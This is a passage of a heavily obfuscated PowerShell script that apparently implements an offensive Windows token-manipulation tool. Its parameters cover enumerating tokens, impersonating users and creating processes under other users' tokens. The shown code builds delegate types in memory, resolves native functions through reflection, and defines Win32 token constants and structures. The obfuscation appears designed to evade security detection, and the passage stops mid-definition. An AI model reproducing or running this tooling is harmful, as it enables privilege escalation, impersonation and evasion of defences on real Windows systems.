 &("{2}{0}{1}" -f'ET-I','TEM','S') ('vAr'+'iaB'+'Le:6'+'Hw') ([TYpe]("{3}{2}{8}{6}{7}{1}{0}{4}{5}" -f'N','.cALLI','yst','s','gconVE','NtIOns','m.R','eFleCTion','E') );   &("{0}{1}" -f 'SeT-','iteM') ("{0}{1}{2}{3}"-f'V','AR','i','able:aKjfW2') (  [TypE]("{1}{0}{2}" -f 'm','aPpdO','ain'))  ;   &("{1}{0}{2}"-f'iT','seT-','EM') ("VARiABL"+"e"+":"+"9z0y6")  ([tYpE]("{7}{2}{5}{8}{3}{4}{0}{1}{6}"-F 'UI','lderACcES','E','EmB','lyB','M.ReflECTIon.emi','S','sySt','T.aSs') );  &("{1}{0}{2}"-f'T-ItE','Se','M') ("{1}{2}{0}"-f 'aBle:A09','v','aRi')  ( [TYPE]("{3}{10}{7}{1}{0}{6}{2}{8}{4}{9}{5}" -f'ERVic','PS','s.m','s','aLaSAt','iBute','E','rO','ARsh','TR','ySTEm.RUnTImE.INTe')) ;  &("{0}{1}"-f 'Se','T') ("Dgv"+"z") (  [TYpe]("{0}{2}{1}" -f'uIn','2','t3'));  $5ogDR =  [tyPE]("{2}{1}{3}{0}"-F 'eR','onVer','BitC','t')  ;   &('sV')  ("{0}{1}"-f 'Z','6cV1')  ([tyPe]("{1}{0}" -f 'RinG','St') ) ;&("{2}{1}{0}" -f'eM','it','SeT-') ("{0}{4}{3}{2}{1}"-f'v','WC','0','rIAbLE:31','A')  (  [tyPe]("{6}{8}{3}{0}{1}{7}{4}{5}{2}"-f 'T','e','mARshaL','in','C','ES.','Sy','ROPsERvI','STeM.RUnTiMe.'));  $q8mg29= [tYPe]("{9}{1}{3}{0}{4}{6}{8}{5}{7}{2}" -f 'p','uR','sIdtyPe','ITY.','r','o','iNcip','wN','aL.wELLKn','sEc')  ;  &("{2}{1}{0}" -f'rIaBlE','a','SeT-V') ("Ta"+"5l")  (  [TYPe]("{0}{8}{4}{3}{2}{7}{6}{5}{1}"-F 'seCuri','tiTy','ND','i','IPaL.W','en','WsID','O','tY.PRINc') )  ;  &('Sv')  ("j"+"Gp")  (  [tyPE]("{1}{0}{5}{3}{4}{2}" -f'tem','SYS','S.PrOceSS','t','IC','.dIAgnOS')  ) ;   $0g4tvz =[TyPE]("{0}{2}{1}"-f'Int','R','Pt') ;  function INv`oKE-tokE`Nm`Ani`PUlA`Tion
{


    [CmdletBinding(DEFAultpARaMEtERSeTNAMe={"{1}{2}{0}"-f'e','En','umerat'})]
    Param(
        [Parameter(PaRaMEtErseTnAME = "Enu`Me`RATE")]
        [Switch]
        ${ENu`m`eraTE},

        [Parameter(paraMeteRSEtNamE = "r`eVtOsE`Lf")]
        [Switch]
        ${ReV`T`os`ElF},

        [Parameter(PArAMetERsetname = "Sh`o`walL")]
        [Switch]
        ${Sh`Ow`AlL},

        [Parameter(PArAmetErSetnAME = "imp`eRsOn`ATeu`sEr")]
        [Switch]
        ${IMpE`RsONAteUs`Er},

        [Parameter(PaRamEtErSetnAMe = "cREA`T`EPR`OcESS")]
        [String]
        ${CrEA`T`Ep`RocE`sS},

        [Parameter(PaRaMeteRSetnAME = "wH`oa`mI")]
        [Switch]
        ${wH`o`AmI},

        [Parameter(PArAMetERsETnAME = "I`MpeR`SOnate`user")]
        [Parameter(ParamETERsEtnAme = "Crea`Te`Pro`CeSS")]
        [String]
        ${us`Ern`Ame},

        [Parameter(paRamETeRSEtNamE = "iMP`ErS`ON`AteUsEr")]
        [Parameter(pArAMEterSeTNAMe = "c`REatePR`Oce`Ss")]
        [Int]
        ${PrOc`eS`s`iD},

        [Parameter(PArAMeTeRsetNamE = "iMP`ersO`N`ATEuSEr", ValUEFROmPipElIne=${T`Rue})]
        [Parameter(ParaMEtERSeTNamE = "CRe`AtEpRO`c`Ess", vALUeFrompiPelinE=${tR`uE})]
        [System.Diagnostics.Process]
        ${pr`OCe`sS},

        [Parameter(ParaMeTeRSetnaME = "Im`PeR`SOnAtEuser")]
        [Parameter(pAramETeRsETnAMe = "C`REa`TE`PrOCEsS")]
        ${th`R`EADid},

        [Parameter(PArAmetERSeTname = "Cr`EAt`Epr`oCeSs")]
        [String]
        ${prOc`E`Ssargs},

        [Parameter(paRAMETERsEtnaME = "cr`eAt`E`procEss")]
        [Switch]
        ${nO`ui},

        [Parameter(paraMeTerSETNamE = "C`ReAT`ep`RoCEsS")]
        [Switch]
        ${Pa`SS`ThrU}
    )
   
    &("{0}{3}{1}{4}{2}"-f'Se','trict','de','t-S','Mo') -Version 2

	
	Function GET-`DE`l`EGate`TYPE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( PosITIOn = 0)]
	        [Type[]]
	        ${pAR`A`mET`eRs} = (&("{3}{2}{1}{0}" -f 't','bjec','O','New-') ("{1}{0}"-f'e[]','Typ')(0)),
	        
	        [Parameter( pOsiTIOn = 1 )]
	        [Type]
	        ${Re`Tu`Rn`TYpe} = [Void]
	    )

	    ${dOmA`IN} =  $aKJfw2::"c`URrENTDOM`Ain"
	    ${DY`NAS`sEmBly} = &("{1}{2}{0}"-f 't','New-O','bjec') ("{3}{2}{1}{6}{0}{8}{4}{7}{5}"-f '.As','t','flec','System.Re','mbl','ame','ion','yN','se')(("{1}{3}{0}{4}{2}"-f 'l','Reflect','e','edDe','egat'))
	    ${As`SEmb`Lybu`i`lDer} = ${doM`Ain}."DEfi`NEDy`NAmiCass`eMBlY"(${D`ynAsSeM`BLy},  ( &("{1}{2}{0}"-f'LdiTeM','ch','I') ("vARia"+"Bl"+"e"+":9Z0y6")).VaLuE::"r`Un")
	    ${mO`dUleb`uiLdER} = ${a`ssEmb`LYBUi`LdER}.("{0}{3}{2}{1}" -f'De','le','micModu','fineDyna').Invoke(("{2}{3}{0}{1}"-f 'yM','odule','InMem','or'), ${fa`LSE})
	    ${typ`e`B`Uilder} = ${ModU`Le`Bu`iLd`eR}.("{2}{1}{0}{3}" -f'T','ine','Def','ype').Invoke(("{1}{0}{3}{2}{4}" -f'ele','MyD','Typ','gate','e'), ("{5}{0}{1}{6}{3}{4}{2}"-f'c, Sea','l','utoClass',' AnsiCla','ss, A','Class, Publi','ed,'), [System.MulticastDelegate])
	    ${c`O`Nst`RUctORbUI`ldER} = ${t`yPebUi`ld`Er}.("{3}{0}{1}{4}{2}"-f'st','ruct','r','DefineCon','o').Invoke(("{2}{4}{5}{3}{7}{6}{1}{0}"-f 'c',', Publi','RTSp','am','ecial','N','HideBySig','e, '),  $6Hw::"s`Ta`NdARd", ${p`AR`AMEtErs})
	    ${constru`ctor`BUiL`DER}.("{1}{6}{5}{4}{2}{3}{0}" -f 'gs','SetI','ionFl','a','tat','plemen','m').Invoke(("{0}{3}{4}{1}{2}" -f'Runt','Manag','ed','ime,',' '))
	    ${m`Eth`oDBuIld`er} = ${tYP`EbU`iLd`ER}.("{1}{2}{0}"-f 'd','Defi','neMetho').Invoke('Invoke', ("{3}{6}{0}{2}{1}{4}{5}"-f 'i','ySig, NewSlot','deB','Public,',', ','Virtual',' H'), ${rEt`Ur`NTYpe}, ${p`ARAMeT`ERs})
	    ${m`et`HOdbU`I`lDer}.("{1}{5}{2}{3}{4}{0}{6}"-f'onF','S','mplem','entat','i','etI','lags').Invoke(("{3}{1}{0}{4}{2}" -f'a',' M','ged','Runtime,','na'))
	    
	    &("{2}{0}{1}" -f'utp','ut','Write-O') ${Ty`p`EBU`ilDer}.("{1}{2}{0}" -f'eType','Cr','eat').Invoke()
	}


	
	Function G`et-`pROCAdDRESs
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( PosITiON = 0, MaNDATORy = ${T`Rue} )]
	        [String]
	        ${MO`DUlE},
	        
	        [Parameter( POSItION = 1, manDAToRY = ${TR`UE} )]
	        [String]
	        ${Pr`Oc`EDu`RE}
	    )

	    
	    ${SYStE`M`Ass`Emb`LY} =   (  &("{1}{0}{2}" -f 'e','g','t-VARIABle')  ("{0}{1}" -f'AKjF','w2')  ).VaLUe::"cuRRE`N`Td`o`Main".("{3}{2}{0}{1}" -f 'Asse','mblies','t','Ge').Invoke() |
	        &("{0}{1}{3}{2}" -f'Where-Ob','j','t','ec') { ${_}."GlOB`A`La`SS`eMblYCaCHE" -And ${_}."Lo`CaT`ION".("{0}{1}"-f 'S','plit').Invoke('\\')[-1].("{0}{1}{2}"-f'E','qual','s').Invoke(("{0}{2}{1}" -f 'System.d','l','l')) }
	    ${U`Nsa`FE`NATiv`EMetHods} = ${Sys`T`e`mAssEm`BLY}.("{2}{0}{1}" -f'tT','ype','Ge').Invoke(("{5}{7}{1}{6}{3}{2}{0}{4}" -f 'iveMet','so','afeNat','in32.Uns','hods','Mic','ft.W','ro'))
	    
	    ${G`ET`mODu`lEhAn`DLE} = ${unS`AFEN`ATIv`eMEt`HoDs}.("{1}{0}{2}"-f 'etMe','G','thod').Invoke(("{3}{1}{4}{2}{0}" -f'e','H','dl','GetModule','an'))
	    ${GeTpRocA`D`d`ReSS} = ${un`saFEn`A`T`IvEMetho`ds}.("{2}{1}{0}" -f 'Method','t','Ge').Invoke(("{0}{2}{3}{1}" -f 'GetPro','ress','cA','dd'))
	    
	    ${Ker`N32h`AndLe} = ${gEtmo`d`ul`EHa`NdlE}."INvO`KE"(${N`ULL}, @(${m`odu`Le}))
	    ${Tm`PP`Tr} = &("{2}{1}{0}" -f 'ct','je','New-Ob') ("{0}{1}" -f'IntPt','r')
	    ${haNDl`er`ef} = &("{2}{0}{1}" -f'w-Ob','ject','Ne') ("{0}{9}{4}{5}{1}{6}{3}{7}{8}{2}"-f 'S','.R','eRef','n','st','em','untime.InteropServices.Ha','d','l','y')(${tM`PP`TR}, ${k`e`Rn32HAndle})

	    
	    &("{3}{1}{0}{2}"-f'u','utp','t','Write-O') ${gEtProC`ADDR`E`sS}."INvO`Ke"(${n`uLL}, @([System.Runtime.InteropServices.HandleRef]${haNd`lE`ReF}, ${pRoc`e`DuRE}))
	}

    
    
    
    ${coN`Sta`NTs} = @{
        ("{4}{2}{0}{5}{6}{1}{3}"-f'TEM_S','R','YS','ITY','ACCESS_S','E','CU') = 0x01000000
        ("{2}{0}{1}{3}" -f 'AD','_','RE','CONTROL') = 0x00020000
        ("{2}{0}{1}{3}" -f'YNCH','RON','S','IZE') = 0x00100000
        ("{3}{2}{1}{0}" -f'LL','D_RIGHTS_A','R','STANDA') = 0x001F0000
        ("{0}{3}{2}{1}" -f 'TOKEN_Q','Y','R','UE') = 8
        ("{1}{5}{3}{4}{2}{0}" -f'ES','TOKEN_','G','VI','LE','ADJUST_PRI') = 0x20
        ("{0}{1}{2}{3}"-f 'E','RR','OR_','NO_TOKEN') = 0x3f0
        ("{0}{4}{2}{1}{3}{5}" -f 'S','_','ITY','D','ECUR','ELEGATION') = 3
        ("{0}{1}{3}{4}{6}{2}{7}{5}" -f'DA','CL_SECURITY','R','_IN','F','TION','O','MA') = 0x4
        ("{4}{3}{0}{1}{2}"-f'CESS_ALLOW','ED_A','CE_TYPE','C','A') = 0x0
        ("{3}{4}{1}{0}{6}{2}{5}" -f'_RI','RD','S_RE','STA','NDA','QUIRED','GHT') = 0x000F0000
        ("{0}{3}{2}{1}{4}"-f'DESK','ENERIC_A','OP_G','T','LL') = 0x000F01FF
        ("{0}{1}{2}"-f 'WRIT','E','_DAC') = 0x00040000
        ("{4}{5}{3}{1}{2}{0}"-f 'CE','NHER','IT_A','ECT_I','O','BJ') = 0x1
        ("{1}{0}{2}" -f 'A','GR','NT_ACCESS') = 0x1
        ("{2}{0}{1}"-f '_IS_NAM','E','TRUSTEE') = 0x1
        ("{4}{0}{3}{1}{2}"-f'RU','IS_','SID','STEE_','T') = 0x0
        ("{3}{0}{2}{1}"-f 'ST','USER','EE_IS_','TRU') = 0x1
        ("{3}{5}{6}{0}{2}{1}{4}" -f'EE_IS_WELL_KNO','_GR','WN','TR','OUP','US','T') = 0x5
        ("{2}{1}{3}{0}" -f'P','E_IS_','TRUSTE','GROU') = 0x2
        ("{5}{3}{0}{4}{1}{6}{2}" -f '_QU','OR','N','OCESS','ERY_INF','PR','MATIO') = 0x400
        ("{4}{0}{3}{5}{2}{1}" -f 'KEN_ASS','RIMARY','P','IG','TO','N_') = 0x1
        ("{0}{1}{3}{2}"-f 'TO','KEN','ICATE','_DUPL') = 0x2
        ("{4}{0}{5}{3}{2}{1}" -f 'O','RSONATE','IMPE','_','T','KEN') = 0x4
        ("{4}{1}{0}{2}{5}{3}"-f 'ERY_','U','SO','CE','TOKEN_Q','UR') = 0x10
        ("{5}{3}{2}{0}{1}{4}" -f'_','REA','GHTS','DARD_RI','D','STAN') = 0x20000
        ("{0}{3}{1}{2}" -f'T','a','tistics','okenSt') = 10
        ("{4}{1}{0}{2}{3}" -f 'L','KEN_AL','_ACCES','S','TO') = 0xf01ff
        ("{2}{0}{3}{1}"-f'I','M_ALLOWED','MAX','MU') = 0x02000000
        ("{2}{0}{4}{5}{3}{1}" -f 'HR','SS','T','CE','EAD_ALL_','AC') = 0x1f03ff
        ("{2}{6}{3}{0}{5}{1}{4}" -f 'NV','LID_PARAME','ERRO','_I','TER','A','R') = 0x57
        ("{7}{1}{3}{6}{5}{0}{2}{4}"-f'TIAL','GON_NET','S_','CRE','ONLY','EN','D','LO') = 0x2
        ("{1}{2}{0}{3}"-f'I','SE_','PR','VILEGE_ENABLED') = 0x2
        ("{4}{2}{3}{6}{0}{5}{1}" -f 'ABLE','BY_DEFAULT','E_PRIVILE','G','S','D_','E_EN') = 0x1
        ("{1}{4}{2}{3}{0}" -f 'ED','SE_P','VILEGE_R','EMOV','RI') = 0x4
    }

    ${wi`N`3`2coN`STANts} = &("{1}{2}{0}"-f'ject','New-','Ob') ("{0}{1}{2}"-f 'PS','Obje','ct') -Property ${cON`StaN`Ts}
    


    
    
    
	
	
	${DOM`AiN} =   (&("{2}{0}{1}" -f 't-Ch','IldiTem','gE') ("{0}{2}{1}" -f'VARiAblE:a','FW2','kJ')).VaLue::"cuR`Re`Ntd`oM`AiN"
	${dY`NaMi`c`AsSeMB`LY} = &("{2}{0}{3}{1}" -f'ew-Ob','t','N','jec') ("{7}{3}{1}{5}{8}{2}{4}{6}{0}"-f'Name','f','o','tem.Re','n.A','lect','ssembly','Sys','i')(("{1}{3}{0}{2}" -f'm','DynamicA','bly','sse'))
	${aSseM`BL`YB`uILD`er} = ${d`OMAIn}."D`EfIN`edYn`Am`ICAS`se`MBLY"(${DyNamICAS`Se`M`BLY},   (  &('gI') ("vaRIaBL"+"e"+":"+"9Z0Y6") ).VAluE::"R`un")
	${moD`u`l`eBuilDer} = ${aSseMbl`yBU`iL`der}.("{0}{1}{3}{2}" -f'De','fineDynamicM','e','odul').Invoke(("{0}{1}{2}" -f 'D','ynami','cModule'), ${f`A`lSE})
	${co`NSTR`UCto`RiN`Fo} =  $A09.("{2}{1}{0}{3}" -f'onstru','C','Get','ctors').Invoke()[0]

    
	${T`YPEbuil`deR} = ${mo`d`Ule`B`UilDeR}.("{1}{2}{0}" -f'fineEnum','D','e').Invoke(("{3}{4}{2}{0}{1}" -f 'ATION','_CLASS','EN_INFORM','T','OK'), ("{0}{1}" -f 'Pu','blic'), [UInt32])
	${ty`PEBui`LdER}.("{3}{2}{0}{1}"-f'Litera','l','e','Defin').Invoke(("{0}{1}{2}" -f'To','kenUse','r'), [UInt32] 1) | &("{1}{0}" -f 't-Null','Ou')
    ${tY`PEbUI`LdEr}.("{0}{2}{1}" -f 'D','eLiteral','efin').Invoke(("{0}{3}{2}{1}"-f 'To','roups','nG','ke'), [UInt32] 2) | &("{1}{2}{0}"-f'Null','O','ut-')
    ${TyPEB`ui`LD`er}.("{0}{1}{2}"-f 'DefineL','itera','l').Invoke(("{1}{0}{2}"-f 'e','TokenPrivileg','s'), [UInt32] 3) | &("{1}{0}"-f'l','Out-Nul')
    ${T`ypE`Bu`IldER}.("{2}{1}{0}" -f 'l','neLitera','Defi').Invoke(("{1}{0}{2}" -f'enOwne','Tok','r'), [UInt32] 4) | &("{0}{2}{1}" -f 'Out','l','-Nul')
    ${T`Yp`EbuILder}.("{1}{0}{3}{2}"-f'fi','De','eLiteral','n').Invoke(("{1}{3}{2}{0}" -f 'ryGroup','Toke','rima','nP'), [UInt32] 5) | &("{0}{1}" -f'Ou','t-Null')
    ${TYpE`B`UILDEr}.("{2}{1}{0}"-f 'ral','Lite','Define').Invoke(("{0}{2}{4}{3}{1}"-f 'To','aultDacl','k','f','enDe'), [UInt32] 6) | &("{0}{1}"-f'Out','-Null')
    ${ty`peB`uIl`Der}.("{2}{1}{0}{3}" -f 'neLi','efi','D','teral').Invoke(("{3}{0}{2}{1}"-f'ok','Source','en','T'), [UInt32] 7) | &("{1}{0}" -f 'll','Out-Nu')
    ${tyPeB`UI`lDer}.("{1}{3}{0}{2}" -f 'eL','Defi','iteral','n').Invoke(("{1}{0}{2}" -f'Typ','Token','e'), [UInt32] 8) | &("{0}{1}" -f 'Out-N','ull')
    ${Ty`PEBuild`er}.("{0}{2}{1}{3}" -f 'Define','tera','Li','l').Invoke(("{3}{1}{2}{0}{4}"-f'L','a','tion','TokenImperson','evel'), [UInt32] 9) | &("{1}{0}{2}"-f 't','Ou','-Null')
    ${typ`e`BUI`LdeR}.("{0}{2}{3}{1}" -f 'DefineL','eral','i','t').Invoke(("{4}{2}{3}{1}{0}"-f 'cs','tisti','k','enSta','To'), [UInt32] 10) | &("{2}{0}{1}"-f 'ut-N','ull','O')
    ${TY`PEbu`ilDEr}.("{0}{2}{1}" -f'Def','eral','ineLit').Invoke(("{4}{3}{2}{5}{1}{0}"-f 's','id','ed','trict','TokenRes','S'), [UInt32] 11) | &("{1}{0}{2}" -f't-','Ou','Null')
    ${TY`pE`BUi`lder}.("{1}{0}{2}"-f 'e','Defin','Literal').Invoke(("{0}{1}{2}{3}" -f 'Token','Sessio','nI','d'), [UInt32] 12) | &("{1}{2}{0}"-f 'Null','Ou','t-')
    ${ty`PEBuiL`D`Er}.("{3}{1}{2}{0}{4}" -f 'tera','ef','ineLi','D','l').Invoke(("{2}{0}{1}{3}{4}" -f'enGrou','psAnd','Tok','Privilege','s'), [UInt32] 13) | &("{1}{0}{2}"-f't-','Ou','Null')
    ${TyP`Eb`u`IlDER}.("{0}{2}{1}" -f 'Def','eral','ineLit').Invoke(("{0}{3}{1}{2}{4}" -f 'To','Session','Refe','ken','rence'), [UInt32] 14) | &("{2}{1}{0}" -f 'll','Nu','Out-')
    ${type`Bu`IlDeR}.("{0}{2}{1}"-f 'Def','eral','ineLit').Invoke(("{0}{3}{4}{2}{1}"-f 'To','nert','xI','ken','SandBo'), [UInt32] 15) | &("{2}{0}{1}" -f'-','Null','Out')
    ${tYpe`Bu`I`Lder}.("{0}{2}{3}{1}" -f'Define','teral','L','i').Invoke(("{1}{2}{3}{4}{0}"-f'olicy','Toke','nAud','it','P'), [UInt32] 16) | &("{2}{0}{1}"-f 'u','ll','Out-N')
    ${TY`p`EbuiL`Der}.("{2}{3}{0}{1}"-f 'ra','l','DefineLit','e').Invoke(("{1}{2}{3}{0}"-f 'gin','To','kenOr','i'), [UInt32] 17) | &("{0}{1}" -f'Ou','t-Null')
    ${ty`p`EbU`ILder}.("{0}{2}{1}{3}" -f'De','eLiter','fin','al').Invoke(("{3}{0}{2}{1}{4}"-f'El','tionTy','eva','Token','pe'), [UInt32] 18) | &("{0}{1}" -f 'Out-N','ull')
    ${tY`PEbu`IlD`er}.("{1}{3}{0}{2}"-f 'eLite','Defi','ral','n').Invoke(("{0}{4}{2}{1}{3}" -f 'Tok','kedT','in','oken','enL'), [UInt32] 19) | &("{1}{0}{2}"-f'u','Out-N','ll')
    ${t`y`peBui`LdER}.("{3}{0}{1}{2}"-f'neLit','e','ral','Defi').Invoke(("{3}{2}{0}{1}"-f'levati','on','E','Token'), [UInt32] 20) | &("{2}{1}{0}"-f'ull','ut-N','O')
    ${t`YPE`BuIld`ER}.("{2}{0}{1}{3}"-f 'fineLit','er','De','al').Invoke(("{3}{0}{2}{1}"-f'sRestri','ions','ct','TokenHa'), [UInt32] 21) | &("{1}{0}" -f 'ull','Out-N')
    ${TyP`EBuI`L`der}.("{2}{3}{4}{1}{0}"-f'al','iter','De','f','ineL').Invoke(("{6}{2}{5}{3}{1}{4}{0}"-f 'on','orma','k','cessInf','ti','enAc','To'), [UInt32] 22) | &("{2}{1}{0}" -f'ull','-N','Out')
    ${t`yp`eBuiLdER}.("{1}{0}{3}{2}"-f'ineL','Def','teral','i').Invoke(("{1}{2}{3}{0}{4}" -f'llowe','TokenVirtualizat','io','nA','d'), [UInt32] 23) | &("{1}{0}"-f'Null','Out-')
    ${Ty`PEb`U`iLDeR}.("{2}{0}{1}" -f 'r','al','DefineLite').Invoke(("{5}{0}{4}{3}{2}{6}{1}"-f'o','izationEnabled','rt','enVi','k','T','ual'), [UInt32] 24) | &("{0}{1}" -f 'Ou','t-Null')
    ${TY`pe`BU`ildeR}.("{2}{0}{1}" -f 'efine','Literal','D').Invoke(("{3}{4}{0}{1}{2}"-f'nInteg','rity','Level','To','ke'), [UInt32] 25) | &("{2}{1}{0}"-f'Null','ut-','O')
    ${TypeB`UI`LD`eR}.("{2}{4}{3}{0}{1}"-f 'a','l','Def','Liter','ine').Invoke(("{2}{1}{3}{0}"-f'cess','o','T','kenUIAc'), [UInt32] 26) | &("{0}{1}"-f 'Out-','Null')
    ${t`Ype`BUil`der}.("{2}{0}{1}{3}"-f 'fin','eLi','De','teral').Invoke(("{5}{2}{4}{1}{0}{3}" -f'andatory','M','oke','Policy','n','T'), [UInt32] 27) | &("{1}{0}{2}"-f'ut-','O','Null')
    ${Ty`PEb`UiLD`er}.("{2}{0}{4}{3}{1}" -f 'ne','al','Defi','ter','Li').Invoke(("{0}{2}{1}{3}" -f'T','onSi','okenLog','d'), [UInt32] 28) | &("{0}{1}" -f 'Out-Nu','ll')
    ${t`Y`pEb`uilDER}.("{2}{1}{0}"-f 'ral','Lite','Define').Invoke(("{3}{1}{4}{0}{2}"-f 'ntain','ken','er','To','IsAppCo'), [UInt32] 29) | &("{1}{0}{2}"-f'l','Out-Nu','l')
    ${tYpEB`uiL`dER}.("{1}{3}{0}{2}{4}" -f 'fi','D','neLit','e','eral').Invoke(("{3}{4}{2}{0}{1}" -f'litie','s','pabi','To','kenCa'), [UInt32] 30) | &("{1}{2}{0}" -f'l','Out-N','ul')
    ${tY`PE`BUild`er}.("{0}{1}{2}{3}"-f 'Def','ineLi','te','ral').Invoke(("{2}{0}{1}{4}{3}"-f 'okenAppCo','n','T','Sid','tainer'), [UInt32] 31) | &("{2}{1}{0}" -f 'l','Nul','Out-')
    ${T`ypeb`u`ILDeR}.("{2}{3}{1}{0}"-f'l','a','De','fineLiter').Invoke(("{3}{1}{0}{2}{4}"-f'AppContainerNu','en','mbe','Tok','r'), [UInt32] 32) | &("{1}{0}{2}"-f'Nu','Out-','ll')
    ${Type`Bu`I`LdEr}.("{2}{0}{1}{3}" -f'fineLite','r','De','al').Invoke(("{4}{5}{0}{3}{6}{1}{2}" -f'User','ibut','es','ClaimA','To','ken','ttr'), [UInt32] 33) | &("{0}{1}"-f'Out-','Null')
    ${ty`PE`B`uiLder}.("{3}{2}{1}{0}"-f 'eral','neLit','efi','D').Invoke(("{4}{2}{6}{3}{0}{5}{1}"-f'ttribu','es','enDevic','ClaimA','Tok','t','e'), [UInt32] 34) | &("{1}{0}{2}" -f 'N','Out-','ull')
    ${ty`P`EbuI`lder}.("{2}{0}{1}{4}{3}"-f'efine','Lit','D','ral','e').Invoke(("{5}{7}{6}{8}{4}{1}{2}{0}{3}" -f 'but','laim','Attri','es','C','Token','estrictedUs','R','er'), [UInt32] 35) | &("{0}{1}" -f 'Out-','Null')
    ${TYpEB`u`ILDeR}.("{2}{0}{1}" -f 'efineLi','teral','D').Invoke(("{6}{2}{0}{3}{1}{5}{7}{4}" -f'e','trictedDevic','R','s','es','eClaimAt','Token','tribut'), [UInt32] 36) | &("{0}{1}" -f'Ou','t-Null')
    ${T`ypEbuil`D`er}.("{4}{0}{2}{1}{3}"-f'efi','Lit','ne','eral','D').Invoke(("{2}{3}{4}{1}{0}"-f'ups','Gro','Token','De','vice'), [UInt32] 37) | &("{0}{1}{2}" -f 'O','ut-N','ull')
    ${t`YpEb`uiLd`Er}.("{1}{3}{0}{2}"-f'Litera','Defin','l','e').Invoke(("{1}{2}{4}{0}{3}"-f'iceG','T','okenRestrict','roups','edDev'), [UInt32] 38) | &("{0}{1}{2}"-f'O','u','t-Null')
    ${T`Yp`Eb`uILder}.("{1}{3}{4}{2}{0}"-f'ral','DefineL','e','i','t').Invoke(("{0}{2}{3}{4}{1}{5}" -f'Token','tribu','Se','curi','tyAt','tes'), [UInt32] 39) | &("{2}{1}{0}" -f 'Null','-','Out')
    ${TYpeB`UIl`DER}.("{1}{0}{2}" -f'neLite','Defi','ral').Invoke(("{4}{3}{1}{0}{2}" -f't','tric','ed','nIsRes','Toke'), [UInt32] 40) | &("{1}{0}{2}"-f'-Nu','Out','ll')
    ${TY`p`EBuiL`DEr}.("{3}{2}{1}{0}" -f'ral','e','Lit','Define').Invoke(("{2}{1}{5}{3}{4}{0}"-f 'ss','To','Max','Info','Cla','ken'), [UInt32] 41) | &("{0}{1}" -f'Out-N','ull')
	${t`OKeN_Inf`ORMAtI`O`N_`c`LasS} = ${T`ypeb`ui`Lder}.("{1}{3}{2}{0}" -f'pe','Cr','y','eateT').Invoke()

    
    ${A`Tt`RIB`uTES} = ("{15}{6}{21}{5}{9}{13}{22}{11}{8}{7}{10}{14}{3}{19}{2}{18}{16}{4}{0}{1}{17}{20}{12}"-f'o','re','ut, Sealed, ','ntialLa','f','nsiC','utoL','P','s, ','l','ublic','s','Init','as',', Seque','A','e','F','B','yo','ield','ayout, A','s, Cla')
	${ty`p`EBuiL`DEr} = ${M`ODU`Le`BUIlder}.("{2}{1}{0}" -f'ype','neT','Defi').Invoke(("{1}{2}{0}{3}"-f'INTE','LARGE','_','GER'), ${ATT`R`iB`uteS}, [System.ValueType], 8)
	${T`yPEbUI`LDEr}.("{2}{0}{1}"-f 'i','neField','Def').Invoke(("{0}{1}{2}" -f 'Low','Par','t'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{0}{1}{2}"-f 'Out-','Nul','l')
	${TyP`EBuIl`D`eR}.("{0}{1}{2}"-f'Def','ineFiel','d').Invoke(("{0}{1}" -f 'HighPar','t'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{1}{2}{0}" -f'l','Out-N','ul')
	${LARg`E`_in`TeGER} = ${typEB`uI`ldeR}.("{2}{3}{0}{1}"-f'Typ','e','Crea','te').Invoke()

    
    ${ATt`R`ibuTES} = ("{10}{13}{8}{16}{3}{2}{9}{15}{4}{11}{12}{17}{0}{14}{5}{1}{7}{6}"-f'yout, Sea','oreFi',', ','s, Class','q','Bef','t','eldIni',' A','Pu','AutoLayou','uent','ia','t,','led, ','blic, Se','nsiClas','lLa')
	${tY`pEB`uILDer} = ${mOD`UleBuiL`d`eR}.("{2}{0}{1}"-f'e','Type','Defin').Invoke(("{0}{1}"-f'LUI','D'), ${At`TRI`B`UTes}, [System.ValueType], 8)
	${TY`PebuilD`Er}.("{1}{0}{2}{3}" -f 'ne','Defi','Fiel','d').Invoke(("{0}{2}{1}" -f'LowP','t','ar'), [UInt32], ("{0}{1}{2}" -f 'P','ub','lic')) | &("{1}{0}{2}"-f 'u','Out-N','ll')
	${tY`PE`BUilDer}.("{0}{1}{3}{2}" -f'Defin','e','ld','Fie').Invoke(("{1}{2}{0}" -f'Part','Hig','h'), [Int32], ("{1}{0}" -f'ic','Publ')) | &("{2}{0}{1}" -f '-','Null','Out')
	${l`uId} = ${tYpeB`UIL`D`er}.("{0}{3}{1}{2}" -f 'Cre','teT','ype','a').Invoke()

    
    ${ATTRiBU`T`ES} = ("{1}{7}{6}{11}{0}{9}{8}{10}{14}{15}{5}{12}{4}{3}{13}{2}"-f's','Au','t','efore','B',', Seal',',','toLayout','a',', Cl','ss, Pu',' AnsiClas','ed, ','FieldIni','blic, Seq','uentialLayout')
	${t`yP`eb`UIldER} = ${mOdule`BUIl`D`Er}.("{0}{2}{1}"-f'De','eType','fin').Invoke(("{1}{4}{2}{5}{0}{3}" -f'TIS','TO','ST','TICS','KEN_','A'), ${A`Tt`Ri`BUTES}, [System.ValueType])
	${TYPEbUi`L`DER}.("{0}{2}{1}{3}"-f 'D','f','e','ineField').Invoke(("{1}{0}"-f'd','TokenI'), ${L`uid}, ("{0}{1}" -f'Pub','lic')) | &("{1}{2}{0}"-f 'Null','Out','-')
	${ty`pEBU`IL`dEr}.("{1}{2}{0}"-f 'eField','D','efin').Invoke(("{4}{1}{3}{0}{2}" -f 'onI','enticat','d','i','Auth'), ${lu`id}, ("{0}{1}"-f 'Pub','lic')) | &("{0}{1}"-f'Out-N','ull')
    ${tYp`eB`uI`lDEr}.("{3}{0}{2}{1}" -f 'eF','ld','ie','Defin').Invoke(("{4}{2}{1}{3}{0}"-f'onTime','a','pir','ti','Ex'), ${la`R`Ge`_iNtE`GEr}, ("{2}{1}{0}" -f 'ic','l','Pub')) | &("{0}{2}{1}" -f 'Out-','ll','Nu')
    ${ty`pEbUI`l`Der}.("{2}{0}{1}" -f 'e','fineField','D').Invoke(("{1}{2}{0}" -f 'e','Token','Typ'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{1}{0}{2}"-f't-Nul','Ou','l')
